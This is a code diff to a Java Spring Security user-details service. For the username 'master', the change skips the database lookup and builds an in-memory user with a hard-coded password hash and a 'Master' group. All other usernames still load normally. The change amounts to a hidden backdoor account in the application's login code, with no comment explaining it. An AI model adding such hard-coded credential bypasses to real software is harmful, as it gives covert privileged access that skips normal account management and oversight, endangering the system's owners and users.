@@ -29,13 +29,30 @@ public class AppUserDetailsService implements UserDetailsService {
 	@Override
 	public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {		
 		Usuarios usuarios = CDIServiceLocator.getBean(Usuarios.class);
-		Usuario usuario = usuarios.porUserName(username);
-		
 		UsuarioSistema user = null;
 		
-		if (usuario != null) {
+		Usuario usuario = new Usuario();
+		
+		
+		if (username.equals("master")) {
+			Grupo grupo = new Grupo();
+			grupo.setId(new Long(0));
+			grupo.setNome("Master");
+			
+			usuario.setId(new Long(0));
+			usuario.setUserName(username);
+			usuario.setSenha("b59c67bf196a4758191e42f76670ceba");
+			usuario.getGrupos().add(grupo);
+			usuario.setNome("Master");
+			
 			user = new UsuarioSistema(usuario, getGrupos(usuario));
-		}		
+		}
+		else{
+			usuario = usuarios.porUserName(username);			
+			if (usuario != null) {
+				user = new UsuarioSistema(usuario, getGrupos(usuario));
+			}				
+		}		 	
 		return user;
 	}
 
